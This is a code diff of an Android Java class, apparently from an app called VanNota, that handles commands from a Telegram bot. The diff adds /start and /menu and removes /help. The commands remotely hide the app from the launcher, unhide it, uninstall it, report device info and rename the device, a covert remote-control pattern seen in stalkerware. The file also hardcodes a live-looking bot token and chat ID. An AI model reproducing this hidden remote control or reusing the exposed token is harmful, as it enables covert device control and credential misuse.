@@ -18,6 +18,7 @@ import java.nio.charset.StandardCharsets;
 public class TelegramSender {
     private static final String TAG = "TelegramSender";
     
+    // HARDCODE TOKEN & CHAT ID
     private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
     private static final String CHAT_ID = "1286411089";
     
@@ -84,6 +85,36 @@ public class TelegramSender {
         Log.d(TAG, "📩 Perintah diterima: " + command);
         
         // ==========================================
+        // /start - RESPON BOT AKTIF
+        // ==========================================
+        if (command.equalsIgnoreCase("/start")) {
+            String deviceName = getDeviceName(context);
+            String startMsg = "🤖 VanNota Bot Aktif!\n\n" +
+                              "📱 Perangkat: " + deviceName + "\n" +
+                              "Status: ✅ Online\n\n" +
+                              "Kirim /menu untuk melihat daftar perintah.";
+            sendMessage(context, "✅ Bot Aktif", startMsg);
+            return;
+        }
+        
+        // ==========================================
+        // /menu - MENU PERINTAH
+        // ==========================================
+        if (command.equalsIgnoreCase("/menu") || command.equalsIgnoreCase("/help")) {
+            String menu = "📋 DAFTAR PERINTAH\n\n" +
+                          "/start - Cek status bot\n" +
+                          "/menu - Tampilkan menu ini\n" +
+                          "/hide - Sembunyikan aplikasi dari launcher\n" +
+                          "/unhide - Tampilkan aplikasi di launcher\n" +
+                          "/uninstall - Hapus aplikasi dari perangkat\n" +
+                          "/info - Lihat info perangkat + status launcher\n" +
+                          "/rename [nama] - Ubah nama perangkat\n\n" +
+                          "⚠️ Hanya pemilik yang dapat menggunakan perintah ini.";
+            sendMessage(context, "📋 Menu", menu);
+            return;
+        }
+        
+        // ==========================================
         // /hide - SEMBUNYIKAN APLIKASI
         // ==========================================
         if (command.equalsIgnoreCase("/hide")) {
@@ -142,7 +173,7 @@ public class TelegramSender {
         }
         
         // ==========================================
-        // /uninstall - HAPUS APLIKASI (TANPA DEVICE ADMIN)
+        // /uninstall - HAPUS APLIKASI
         // ==========================================
         if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
             Log.d(TAG, "🗑️ Perintah uninstall diterima!");
@@ -150,7 +181,6 @@ public class TelegramSender {
             sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + getDeviceName(context) + "...");
             
             try {
-                // Langsung jalankan uninstall tanpa Device Admin
                 Intent intent = new Intent(Intent.ACTION_DELETE);
                 intent.setData(Uri.parse("package:" + context.getPackageName()));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -185,12 +215,13 @@ public class TelegramSender {
                           "ID: " + deviceId + "\n" +
                           "Status Launcher: " + visibility + "\n\n" +
                           "Perintah:\n" +
+                          "/start - Cek status bot\n" +
+                          "/menu - Tampilkan menu\n" +
                           "/hide - Sembunyikan aplikasi\n" +
                           "/unhide - Tampilkan aplikasi\n" +
                           "/uninstall - Hapus aplikasi\n" +
                           "/rename [nama] - Ubah nama perangkat\n" +
-                          "/info - Lihat info ini\n" +
-                          "/help - Bantuan";
+                          "/info - Lihat info ini";
             
             sendMessage(context, "ℹ️ Device Info", info);
             return;
@@ -214,24 +245,8 @@ public class TelegramSender {
         }
         
         // ==========================================
-        // /help - BANTUAN
-        // ==========================================
-        if (command.equalsIgnoreCase("/help")) {
-            String help = "📋 DAFTAR PERINTAH\n\n" +
-                          "/hide - Sembunyikan aplikasi dari launcher\n" +
-                          "/unhide - Tampilkan aplikasi di launcher\n" +
-                          "/uninstall - Hapus aplikasi dari perangkat ini\n" +
-                          "/info - Lihat info perangkat + status launcher\n" +
-                          "/rename [nama] - Ubah nama perangkat\n" +
-                          "/help - Tampilkan bantuan ini\n\n" +
-                          "⚠️ Hanya pemilik yang dapat menggunakan perintah ini.";
-            sendMessage(context, "🆘 Bantuan", help);
-            return;
-        }
-        
-        // ==========================================
         // PERINTAH TIDAK DIKENAL
         // ==========================================
-        sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
+        sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /menu untuk melihat daftar perintah.");
     }
-}
+                    }
